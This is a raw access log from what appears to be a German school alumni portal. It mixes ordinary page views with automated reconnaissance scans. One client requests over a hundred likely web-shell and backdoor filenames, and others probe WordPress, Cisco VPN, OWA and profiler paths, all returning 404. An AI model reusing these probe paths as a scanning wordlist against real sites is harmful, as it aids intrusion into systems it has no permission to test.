3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:34;;/slo.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:34;;/dropdown.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:34;;/pp.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:34;;/wp-content/themes/pridmag/db.php?u;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:34;;/bqcheck.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:34;;/13k.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:34;;/ar.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:35;;/bv3.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:35;;/aa.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:35;;/racs3.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:35;;/content.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:35;;/lufix.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:35;;/bluejackets.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:35;;/zt2.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:35;;/f35.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:35;;/wp-mn.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:36;;/modules/mod_simplefileuploadv1.3/elements/wpxadmin.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:36;;/aa8.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:36;;/xl.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:36;;/r4f_1.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:36;;/sarang.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:36;;/goods.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:36;;/6.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:36;;/xo.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:36;;/ggs.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:37;;/wsr2.php?p=;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:37;;/class9.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:37;;/public/wsr2.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:37;;/tcp.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:37;;/witmm.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:37;;/fm.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:37;;/jga.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:37;;/nxx.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:38;;/aaaa.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:38;;/2.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:38;;/ss.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:38;;/zc.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:38;;/dex.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:38;;/sad.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:38;;/wp.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:38;;/wp-gr.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:39;;/cfile.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:39;;/sder52u.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:39;;/asserter.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:39;;/ol.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:39;;/pass.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:39;;/l.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:39;;/ot.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:39;;/wp-rss4.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:40;;/dev.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:40;;/bin.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:40;;/yee.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:40;;/epinyins.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:40;;/aa17.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:40;;/winkel.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:40;;/ef.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:40;;/gifclass4.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:40;;/667.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:40;;/we.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:41;;/wp-su.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:41;;/t3x.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:41;;/13.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:41;;/yasnu.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:41;;/trd.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:41;;/oiepfuav.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:41;;/02.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:41;;/file2.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:42;;/makeasmtp.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:42;;/upload.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:42;;/btufulhs.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:42;;/ant.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:42;;/bb5.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:42;;/akc.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:42;;/s.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:43;;/yzkvrell.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:43;;/gmo.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:43;;/zc-749.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:43;;/.well-known/fm.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:43;;/ava.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:43;;/nqsa.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:43;;/2020.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:43;;/rak.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:44;;/bypass.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:44;;/zr.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:44;;/wander.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:44;;/lock360.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:44;;/great.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:44;;/fifii.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:44;;/12.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:44;;/efile.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:45;;/past1.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:45;;/7.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:45;;/4563.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:45;;/re.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:45;;/up.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:45;;/35.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:45;;/witm.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:46;;/atomlib.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:46;;/bless2.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:46;;/new4.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:46;;/wsr2.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:46;;/shlo.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:46;;/CLA.php;GET;404
3faaa976d3032b9d3d3ee36303c7b2f6b1962abcfff0dc40027a5b941165908c;2025-11-16 05:09:46;;/kill-9-1.php;GET;404
714319c2689419aad60c43a97ea46c5b154e04db8e18570e691f95ec9c2b2db3;2025-11-16 05:11:56;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:55;;/;GET;200
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:55;;//wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:55;;//xmlrpc.php?rsd;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:56;;/;GET;200
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:56;;//blog/wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:56;;//web/wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:56;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:56;;//website/wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:57;;//wp/wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:57;;//news/wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:57;;//2018/wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:57;;//2019/wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:57;;//shop/wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:58;;//wp1/wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:58;;//test/wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:58;;//media/wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:58;;//wp2/wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:59;;//site/wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:59;;//cms/wp-includes/wlwmanifest.xml;GET;404
2619b95ec23fef4c494ce0d708a845e5655ac10a19680fa7a969ba3cac3af153;2025-11-16 05:12:59;;//sito/wp-includes/wlwmanifest.xml;GET;404
56c72a47671baaece47795a8d43ef4e22982bfbae3d965d196dff42d583fabe0;2025-11-16 05:14:27;;/personen/alumni/schule/07A05;GET;200
b7cc909bdad3811d2a1712999997e29db8123b8ae778f79ee4baf2fc04216600;2025-11-16 05:23:16;/;/;GET;200
0f56ac083e213fd0719873126f024c467c069de49a8c926edcf9a4c0a28e1b6f;2025-11-16 05:29:39;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
89fddd32b39ce56072f0786697ae2d416e0f2429044273239f8b166699e0e575;2025-11-16 05:34:47;;/;GET;200
87d896b92de3ff24c64238c8ec83730754bdbb986d7d43630de2a250f706c32b;2025-11-16 05:40:15;;/media/cache/avatar/images/user/a18c50d9a68390dd0addaaba28a42c6c.jpg;GET;404
3f603d208d3bd8b4d45244a3ae56bd763c466b91ae01ae571479c38b514cd42a;2025-11-16 05:44:55;;/personen/alumni/schule/01A04;GET;200
0720e93c279e3af3fd7d18178f7d9428f0a870dcb170ae77781550d08ba3bbf6;2025-11-16 05:47:58;;/;GET;200
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-16 05:57:11;/;/;GET;200
d9593e6ab4016e67b946b8e766fdb85daca7e35a3a1fa5f21a9234ef2c793b43;2025-11-16 06:04:37;;/login;GET;200
19cb88d92ffad15b0b304ea98e343aa7ecb07042a010dea2873a1be62625d902;2025-11-16 06:05:25;;/personen/alumni/schule/04A04;GET;200
d16d83a46904833d0fea793830255d730116ef3af9a07fc8f9a37d166be1e4e5;2025-11-16 06:06:43;;/;GET;200
994cdf2a9d87f4b65f7101e01398e535979a38850f3f6189287ff80bc3b1b52a;2025-11-16 06:07:40;;/;GET;200
a0f4d2d3869c765a0ec69a8ba65f522de59824a47ad8dad613b39128bf494597;2025-11-16 06:12:58;;/personen/alumni/schule/5826;GET;200
6ee08fd12f6fb1322903b2331a61b8f0067131906efec83759004b3740c715ef;2025-11-16 06:15:53;;/aktuelles/stellenangebote;GET;200
6a346dbc1e80e045b36ad7fe35eefd268c8340fdcde98b1ed5d49f5341a4fed2;2025-11-16 06:15:57;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
8b146c1c0bb99ea1fca676e22b3d9073ab613dae4d96ee0bd84d809d941b9b97;2025-11-16 06:24:12;;/personen/alumni/schule/03A04;GET;200
ef24caa38be7eb22520a4c9bf46a8d4b628995d8d949ac7a3266ce3301a99d6f;2025-11-16 06:25:58;;/personen/alumni/schule/9004;GET;200
ced2d99d35686a84e897f9728aa084f2d179e8ecd40998e5ba37da2f6f21f3a7;2025-11-16 06:34:19;;/owa/auth/logon.aspx;GET;404
afd25e7419e4b022ca5ebcbb774db119576cd93f3ef77b94c40908523fb2f527;2025-11-16 06:35:22;;/;GET;200
63f06974be0892def7c8c91292a1cb294c3337a843e6ee4f9ca63be076abedc2;2025-11-16 06:39:31;;/personen/alumni/schule/10A04;GET;200
cd7aec8f7dbb361beba9a17bbe2bcbbed19ff204a42fc57243d6ddf55d289c6e;2025-11-16 06:52:40;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
76e195031db9402f10b66e650e548a4a0316c8f9fb9d500b5c234339846d5c7c;2025-11-16 06:53:45;;/aktuelles/meldungen;GET;200
f944d09c3f7b256b646233cece4dbf4eddf9a081b98def9929e0df97cb813fee;2025-11-16 06:57:35;;/;GET;200
ffb38d82fae9893b70d8c6e7a0c970b59d2b3f41608f583674947472697e153f;2025-11-16 06:59:36;/;/;GET;200
964b79cf1368ea211cd42bc6a8d060e9b0a365f1952c961b9d3ea517598e3dfb;2025-11-16 07:00:04;;/_profiler/phpinfo;GET;404
964b79cf1368ea211cd42bc6a8d060e9b0a365f1952c961b9d3ea517598e3dfb;2025-11-16 07:00:10;;/_profiler/search;GET;404
4d594e973e3a2b8f518335c719ec16a07e37a3d993a1b74242286384ba5398f4;2025-11-16 07:02:28;;/;GET;200
352a6ef90002509b9be6633e6270374cd7ed5ee2dfd9768ee256c63e51e1a790;2025-11-16 07:07:46;;/;GET;200
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-16 07:08:22;;/;GET;200
00bd21ab874cecdb5691820263765ffcbcc1b5bd63bfc904827f1435995464a2;2025-11-16 07:09:05;;/;GET;200
0d95e775e3823f9afc376fdf4f38596ed06900030b308e8429094a514f7bf779;2025-11-16 07:09:21;;/.well-known/security.txt;GET;404
adb290a21a958e13e56aa29d549d28f83b68b3c11cc24ec2f3d48bf5f9657b0e;2025-11-16 07:10:08;;/personen/alumni/schule/9004;GET;200
5f180a1a78671703bedbb0db07fd88f57144c7c9056c840918ddd890e3cc9a8b;2025-11-16 07:12:35;;/;GET;200
00bd21ab874cecdb5691820263765ffcbcc1b5bd63bfc904827f1435995464a2;2025-11-16 07:14:03;;/webui/;GET;404
78cf6aabb2bbcb0e7b23b4a17ee5fdd55e1b178255190ed6b3cfa05431b7d994;2025-11-16 07:19:17;;/;GET;200
de08aa2c2f2f4200b55761d9c18b4d17e1924e62af9591bb457068ec0153cf20;2025-11-16 07:26:48;;/;GET;200
45ab3ee4879c0caa8c3b1af9061093a1af7125f00b3c31c1d88fd6bee21b3d59;2025-11-16 07:28:08;;/;GET;200
7334d21291d69bf53c9a225506523cc4ebc3ba5da17edaa8a9e561dba51ad125;2025-11-16 07:28:11;;/themen/details/erfolgreich-durch-die-abiturprufungen;GET;200
db4caab32dbadee468bb1f21f21756f3068210a29c1fc61ba05155ac2255bf55;2025-11-16 07:30:07;;/;GET;200
00bd21ab874cecdb5691820263765ffcbcc1b5bd63bfc904827f1435995464a2;2025-11-16 07:32:51;;/geoserver/web/;GET;404
301e666ea0c944e347b624f4972b2b977e5cdb3645f451e1a71103667a2da7a8;2025-11-16 07:47:23;;/;GET;200
b82c7992ba7ccb2cea8c3eb856c1409e9efdfc8aa49cf49c57a9819b5c173ad0;2025-11-16 07:47:54;;/personen/alumni/schule/BW001;GET;200
b91a07f0a13d04a47951d341034c0c130e8bad5ef664a6dd6d6d528c0772c4d8;2025-11-16 08:02:27;;/themen/details/bucher-auf-dem-abstellgleis;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-16 08:09:40;/gruppen/interesse/it-und-softwareentwicklung;/personen/alumni/details/cynthia-ott;GET;200
994974be93c1078be5d1f99e617585165555fc21fc68409055de47f4bfa0e47b;2025-11-16 08:09:50;;/personen/alumni/schule/SL001;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-16 08:11:05;/gruppen/plausch/ai-driven-programme;/gruppen/hobby/musikproduktion;GET;302
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-16 08:11:07;/gruppen/plausch/ai-driven-programme;/gruppen;GET;200
851000950e3e11c08634ed91ae5c0c467f1cf9abdf302d77c4fe17c8928d28a8;2025-11-16 08:12:17;;/;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-16 08:12:28;/gruppen/plausch/ai-driven-programme;/gruppen/hobby/mathematik-wettbewerbe;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-16 08:12:29;/gruppen/plausch/ai-driven-programme;/gruppen;GET;200
4d453acdbc340b15f414b92e4b6583be138b4cbb49abf15af6aac7e543b28ce1;2025-11-16 08:28:41;;/personen/alumni/schule/67933;GET;200
1d0005774361014c3ef5fa1ce64125ba4748f1944f3e543ee4c503096d16cb8f;2025-11-16 08:33:44;;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
412b17bf481e01a9880f5a8f54fd398be3a6806fca2ef33f2d60e4b2f748402b;2025-11-16 08:34:21;;/;GET;200
d8838d442e6bdd098555c75b8b5783a0a017cc69fa32e8a459643c0aec075b12;2025-11-16 08:42:55;;/;GET;200
8315bba8a015e7b8329d468085a1233a3e0cc6a1f491055ba0d7b8ecb86392dd;2025-11-16 08:45:32;;/;GET;200
8e80cbd4248a929f38f67575f8726107a0e84a0e416d452ef6010e89dd5f6e97;2025-11-16 08:47:52;;/personen/alumni/schule/5508;GET;200
408e252a3f05f75eb0f8cab8034663d271a3b4f2f49f43d30aa4c5ad73c8f783;2025-11-16 08:49:47;;/+CSCOL+/Java.jar;GET;404
408e252a3f05f75eb0f8cab8034663d271a3b4f2f49f43d30aa4c5ad73c8f783;2025-11-16 08:49:47;;/+CSCOE+/logon_forms.js;GET;404
408e252a3f05f75eb0f8cab8034663d271a3b4f2f49f43d30aa4c5ad73c8f783;2025-11-16 08:49:48;;/+CSCOL+/a1.jar;GET;404
408e252a3f05f75eb0f8cab8034663d271a3b4f2f49f43d30aa4c5ad73c8f783;2025-11-16 08:49:48;;/+CSCOE+/transfer.js;GET;404
2b8329bc61806f93f75c484a19f59d52f4904f5c6240d09ec32aaf644c984951;2025-11-16 08:53:31;;/personen/alumni/schule/9002;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-16 08:56:57;/personen/alumni/schule/4240404;/about/allgemein;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-16 09:00:16;/personen/alumni/schule/4240404;/rechtliches/impressum;GET;200
38c45d0d45062ba5a845765444424f067fa0dabfd8bfbff27f90b033c9cff005;2025-11-16 09:08:05;;/;GET;200
ab4c4a7d2d44cef82ce059e16fe7461fb2d46ce24e330fd08023660d94d29d62;2025-11-16 09:10:44;;/personen/alumni/schule/MP004;GET;200
144f7b9b93c42a926f4cb875393dab736fa26429e4981b867e378b0993f53215;2025-11-16 09:11:04;;/;GET;200
57419f856813934f349407347b5534d4b03a7aa9b57ee065612762308dc509ef;2025-11-16 09:14:21;;/personen/alumni/schule/620014;GET;200
9add7da26b56433d6822d9f410c2dda1565363630c12b61cc7b8fa9db1882d35;2025-11-16 09:15:41;;/personen/alumni/details/cynthia-ott;GET;200
9add7da26b56433d6822d9f410c2dda1565363630c12b61cc7b8fa9db1882d35;2025-11-16 09:15:43;;/personen/alumni/details/jana-zenker;GET;200
9add7da26b56433d6822d9f410c2dda1565363630c12b61cc7b8fa9db1882d35;2025-11-16 09:15:45;;/themen/2;GET;200
9add7da26b56433d6822d9f410c2dda1565363630c12b61cc7b8fa9db1882d35;2025-11-16 09:15:47;;/gruppen/plausch/ai-driven-programme;GET;302
9add7da26b56433d6822d9f410c2dda1565363630c12b61cc7b8fa9db1882d35;2025-11-16 09:15:47;;/themen/details/der-start-ins-studium;GET;200
18856f506535897c7e5edcdb4292a683be81eac4c6a4e8a63ba37d58b41483e1;2025-11-16 09:16:16;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-16 09:25:15;;/themen?category=community;GET;200
fd4039391b1f5d8ad60be1dc75ebb6b4f3104799f72ad6c3b58ac01c51188f96;2025-11-16 09:25:41;;/.well-known/security.txt;GET;404
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-16 09:26:15;;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-16 09:27:24;;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
708bba5bf76455b467b5f349f51ffecf6ace0ba4c81a2c735329c84d4318856e;2025-11-16 09:31:59;;/;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-16 09:32:01;/themen?category=wissenschaft;/themen/2;GET;200
d1a037395fa7e788967aa009a3e2e503a6cbcd5cbaa351d7fa39eaf13f777d1e;2025-11-16 09:35:18;;/personen/alumni/schule/9001;GET;200
